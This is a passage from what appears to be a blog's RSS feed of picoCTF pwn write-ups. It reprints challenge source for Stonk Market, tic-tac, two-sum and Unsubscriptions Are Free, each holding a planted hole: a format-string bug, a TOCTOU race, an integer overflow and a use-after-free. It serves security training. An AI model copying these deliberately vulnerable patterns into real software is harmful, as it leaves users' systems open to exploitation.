&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---stonk-market/</guid><description>&lt;h1 id="picoctf---stonk-market">
 PicoCTF - Stonk Market
 &lt;a class="anchor" href="#picoctf---stonk-market">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>FMT&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;time.h&amp;gt;

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf(&amp;#34;\nPortfolio as of &amp;#34;);
	fflush(stdout);
	system(&amp;#34;date&amp;#34;); // TODO: implement this in C
	fflush(stdout);

	printf(&amp;#34;\n\n&amp;#34;);
	Stonk *head = p-&amp;gt;head;
	if (!head) {
		printf(&amp;#34;You don&amp;#39;t own any stonks!\n&amp;#34;);
	}
	while (head) {
		printf(&amp;#34;%d shares of %s\n&amp;#34;, head-&amp;gt;shares, head-&amp;gt;symbol);
		head = head-&amp;gt;next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares &amp;lt; 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk-&amp;gt;shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i &amp;lt;= MAX_SYM_LEN; i++) {
		if (i &amp;lt; AI_symbol_len) {
			stonk-&amp;gt;symbol[i] = &amp;#39;A&amp;#39; + (rand() % 26);
		} else {
			stonk-&amp;gt;symbol[i] = &amp;#39;\0&amp;#39;;
		}
	}

	stonk-&amp;gt;next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen(&amp;#34;api&amp;#34;,&amp;#34;r&amp;#34;);
	if (!f) {
		printf(&amp;#34;Flag file not found\n&amp;#34;);
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p-&amp;gt;money;
	int shares = 0;
	Stonk *temp = NULL;
	printf(&amp;#34;Using patented AI algorithms to buy stonks\n&amp;#34;);
	while (money &amp;gt; 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp-&amp;gt;next = p-&amp;gt;head;
		p-&amp;gt;head = temp;
		money -= shares;
	}
	printf(&amp;#34;Stonks chosen\n&amp;#34;);

	char *user_buf = malloc(300 + 1);
	printf(&amp;#34;What is your API token?\n&amp;#34;);
	scanf(&amp;#34;%300s&amp;#34;, user_buf);
	printf(&amp;#34;Buying stonks with token:\n&amp;#34;);
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p-&amp;gt;money = (rand() % 2018) + 1;
	p-&amp;gt;head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p-&amp;gt;head;
	Stonk *next = NULL;
	while (current) {
		next = current-&amp;gt;next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf(&amp;#34;Memory failure\n&amp;#34;);
		exit(1);
	}

	int resp = 0;

	printf(&amp;#34;Welcome back to the trading app!\n\n&amp;#34;);
	printf(&amp;#34;What would you like to do?\n&amp;#34;);
	printf(&amp;#34;1) Buy some stonks!\n&amp;#34;);
	printf(&amp;#34;2) View my portfolio\n&amp;#34;);
	scanf(&amp;#34;%d&amp;#34;, &amp;amp;resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf(&amp;#34;Goodbye!\n&amp;#34;);

	exit(0);
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---tic-tac/</guid><description>&lt;h1 id="picoctf---tic-tac">
 PicoCTF - tic-tac
 &lt;a class="anchor" href="#picoctf---tic-tac">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://myapollo.com.tw/blog/interview-question-race-condition/">後端工程師面試考什麼 - Race Condition 篇&lt;/a>
&lt;a href="https://ithelp.ithome.com.tw/articles/10208763"> [Day24]攻擊篇 &lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>TOCTTOU&lt;/p>
&lt;p>Time of check to time of use
在檢查和使用之間影響資源狀態的攻擊&lt;/p>
&lt;p>這種攻擊可能發生在共享資源中。
可能導致程式在資源處於意外狀態時執行無效操作。&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp=" data-lang="cpp=">#include &amp;lt;iostream&amp;gt;
#include &amp;lt;fstream&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/stat.h&amp;gt;

int main(int argc, char *argv[]) {
 if (argc != 2) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Usage: &amp;#34; &amp;lt;&amp;lt; argv[0] &amp;lt;&amp;lt; &amp;#34; &amp;lt;filename&amp;gt;&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 std::string filename = argv[1];
 std::ifstream file(filename);
 struct stat statbuf;

 // Check the file&amp;#39;s status information.
 if (stat(filename.c_str(), &amp;amp;statbuf) == -1) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not retrieve file information&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Check the file&amp;#39;s owner.
 if (statbuf.st_uid != getuid()) {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: you don&amp;#39;t own this file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 // Read the contents of the file.
 if (file.is_open()) {
 std::string line;
 while (getline(file, line)) {
 std::cout &amp;lt;&amp;lt; line &amp;lt;&amp;lt; std::endl;
 }
 } else {
 std::cerr &amp;lt;&amp;lt; &amp;#34;Error: Could not open file&amp;#34; &amp;lt;&amp;lt; std::endl;
 return 1;
 }

 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - two-sum</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---two-sum/</guid><description>&lt;h1 id="picoctf---two-sum">
 PicoCTF - two-sum
 &lt;a class="anchor" href="#picoctf---two-sum">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>BoF&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static int addIntOvf(int result, int a, int b) {
 result = a + b;
 if(a &amp;gt; 0 &amp;amp;&amp;amp; b &amp;gt; 0 &amp;amp;&amp;amp; result &amp;lt; 0)
 return -1;
 if(a &amp;lt; 0 &amp;amp;&amp;amp; b &amp;lt; 0 &amp;amp;&amp;amp; result &amp;gt; 0)
 return -1;
 return 0;
}

int main() {
 int num1, num2, sum;
 FILE *flag;
 char c;

 printf(&amp;#34;n1 &amp;gt; n1 + n2 OR n2 &amp;gt; n1 + n2 \n&amp;#34;);
 fflush(stdout);
 printf(&amp;#34;What two positive numbers can make this possible: \n&amp;#34;);
 fflush(stdout);
 
 if (scanf(&amp;#34;%d&amp;#34;, &amp;amp;num1) &amp;amp;&amp;amp; scanf(&amp;#34;%d&amp;#34;, &amp;amp;num2)) {
 printf(&amp;#34;You entered %d and %d\n&amp;#34;, num1, num2);
 fflush(stdout);
 sum = num1 + num2;
 if (addIntOvf(sum, num1, num2) == 0) {
 printf(&amp;#34;No overflow\n&amp;#34;);
 fflush(stdout);
 exit(0);
 } else if (addIntOvf(sum, num1, num2) == -1) {
 printf(&amp;#34;You have an integer overflow\n&amp;#34;);
 fflush(stdout);
 }

 if (num1 &amp;gt; 0 || num2 &amp;gt; 0) {
 flag = fopen(&amp;#34;flag.txt&amp;#34;,&amp;#34;r&amp;#34;);
 if(flag == NULL){
 printf(&amp;#34;flag not found: please run this on the server\n&amp;#34;);
 fflush(stdout);
 exit(0);
 }
 char buf[60];
 fgets(buf, 59, flag);
 printf(&amp;#34;YOUR FLAG IS: %s\n&amp;#34;, buf);
 fflush(stdout);
 exit(0);
 }
 }
 return 0;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - Unsubscriptions Are Free</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/pwn/picoctf---unsubscriptions-are-free/</guid><description>&lt;h1 id="picoctf---unsubscriptions-are-free">
 PicoCTF - Unsubscriptions Are Free
 &lt;a class="anchor" href="#picoctf---unsubscriptions-are-free">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>Heap Exploitation / Used After Free&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdint.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;string.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;ctype.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define FLAG_BUFFER 200
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#define LINE_BUFFER_SIZE 20
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">typedef&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	uintptr_t (&lt;span style="color:#f92672">*&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>username;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>} cmd;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> choice;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cmd &lt;span style="color:#f92672">*&lt;/span>user;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">hahaexploitgobrrr&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	&lt;span style="color:#66d9ef">char&lt;/span> buf[FLAG_BUFFER];
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	FILE &lt;span style="color:#f92672">*&lt;/span>f &lt;span style="color:#f92672">=&lt;/span> fopen(&lt;span style="color:#e6db74">&amp;#34;flag.txt&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;r&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fgets(buf,FLAG_BUFFER,f);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fprintf(stdout,&lt;span style="color:#e6db74">&amp;#34;%s&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,buf);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	fflush(stdout);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#a6e22e">getsline&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	getchar();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> line &lt;span style="color:#f92672">=&lt;/span> malloc(&lt;span style="color:#ae81ff">100&lt;/span>), &lt;span style="color:#f92672">*&lt;/span> linep &lt;span style="color:#f92672">=&lt;/span> line;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	size_t lenmax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>, len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">int&lt;/span> c;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(line &lt;span style="color:#f92672">==&lt;/span> NULL)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">for&lt;/span>(;;) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		c &lt;span style="color:#f92672">=&lt;/span> fgetc(stdin);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(c &lt;span style="color:#f92672">==&lt;/span> EOF)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">--&lt;/span>len &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			len &lt;span style="color:#f92672">=&lt;/span> lenmax;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span> linen &lt;span style="color:#f92672">=&lt;/span> realloc(linep, lenmax &lt;span style="color:#f92672">*=&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">if&lt;/span>(linen &lt;span style="color:#f92672">==&lt;/span> NULL) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				free(linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>				&lt;span style="color:#66d9ef">return&lt;/span> NULL;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			line &lt;span style="color:#f92672">=&lt;/span> linen &lt;span style="color:#f92672">+&lt;/span> (line &lt;span style="color:#f92672">-&lt;/span> linep);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			linep &lt;span style="color:#f92672">=&lt;/span> linen;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">if&lt;/span>((&lt;span style="color:#f92672">*&lt;/span>line&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#f92672">=&lt;/span> c) &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\n&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">*&lt;/span>line &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;\0&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">return&lt;/span> linep;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doProcess&lt;/span>(cmd&lt;span style="color:#f92672">*&lt;/span> obj) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	(&lt;span style="color:#f92672">*&lt;/span>obj&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo)();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">s&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	printf(&lt;span style="color:#e6db74">&amp;#34;OOP! Memory leak...%p&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,hahaexploitgobrrr);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Thanks for subsribing! I really recommend becoming a premium member!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">p&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Membership pending... (There&amp;#39;s also a super-subscription you can also get for twice the price!)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">m&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;Account created.&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">leaveMessage&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;I only read premium member messages but you can &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;try anyways:&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span> msg &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)malloc(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	read(&lt;span style="color:#ae81ff">0&lt;/span>, msg, &lt;span style="color:#ae81ff">8&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">char&lt;/span> response;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;You&amp;#39;re leaving already(Y/N)?&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>response);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(toupper(response)&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Y&amp;#39;&lt;/span>){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Bye!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		free(user);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Ok. Get premium membership please!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">printMenu&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;Welcome to my stream! ^W^&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;==========================&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(S)ubscribe to my channel&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(I)nquire about account deletion&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(M)ake an Twixer account&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 	puts(&lt;span style="color:#e6db74">&amp;#34;(P)ay for premium membership&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(l)eave a message(with or without logging in)&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	puts(&lt;span style="color:#e6db74">&amp;#34;(e)xit&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">processInput&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> scanf(&lt;span style="color:#e6db74">&amp;#34; %c&amp;#34;&lt;/span>, &lt;span style="color:#f92672">&amp;amp;&lt;/span>choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choice &lt;span style="color:#f92672">=&lt;/span> toupper(choice);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">switch&lt;/span>(choice){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;S&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">if&lt;/span>(user){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 		user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)s;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}&lt;span style="color:#66d9ef">else&lt;/span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		puts(&lt;span style="color:#e6db74">&amp;#34;Not logged in!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;P&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	user&lt;span style="color:#f92672">-&amp;gt;&lt;/span>whatToDo &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span>)p;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">break&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">case&lt;/span> &lt;span style="color:#e6db74">&amp;#39;I&amp;#39;&lt;/span>&lt;span style="color:#f92672">:&lt;/span>
